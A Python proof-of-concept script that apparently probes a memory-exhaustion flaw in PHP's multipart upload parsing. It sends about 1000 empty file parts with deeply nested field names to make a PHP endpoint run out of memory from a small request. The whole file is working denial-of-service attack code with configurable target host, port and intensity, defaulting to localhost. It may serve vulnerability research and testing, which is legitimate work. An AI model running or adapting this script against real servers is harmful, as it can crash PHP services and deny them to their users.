#!/usr/bin/env python3
"""Default-limit OOM probe for the PHP2Shell RFC1867 amplifier.

Each part is an empty upload (`filename=""`), so it does not consume
max_file_uploads.  PHP still registers the six $_FILES metadata entries.
Nested field names force a separate array hierarchy per metadata entry.
With the default 8M post_max_size, ~1000 parts / 60 levels can exhaust the
default 128M memory_limit while the HTTP body remains below 1 MiB.
"""
import argparse
import http.client
import secrets


def build_body(pressure: int, levels: int, boundary: str) -> bytes:
    b = boundary.encode()
    out = bytearray()
    for i in range(pressure):
        name = f"f{i:04d}" + "[a]" * levels
        out += b"--" + b + b"\r\n"
        out += (b'Content-Disposition: form-data; name="'
                + name.encode() + b'"; filename=""\r\n')
        out += b"Content-Type: application/octet-stream\r\n\r\n\r\n"
    out += b"--" + b + b"--\r\n"
    return bytes(out)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18090)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--pressure", type=int, default=1000)
    ap.add_argument("--levels", type=int, default=60)
    ap.add_argument("--boundary", default=None)
    ap.add_argument("--timeout", type=float, default=60.0)
    args = ap.parse_args()

    boundary = args.boundary or ("----php2shell" + secrets.token_hex(8))
    body = build_body(args.pressure, args.levels, boundary)
    print(f"body={len(body)} pressure={args.pressure} levels={args.levels}")

    conn = http.client.HTTPConnection(args.host, args.port,
                                      timeout=args.timeout)
    try:
        conn.request(
            "POST", args.path, body=body,
            headers={"Content-Type":
                     f"multipart/form-data; boundary={boundary}",
                     "Connection": "close"})
        resp = conn.getresponse()
        data = resp.read()
        print(f"status={resp.status} body={data[:300]!r}")
    finally:
        conn.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
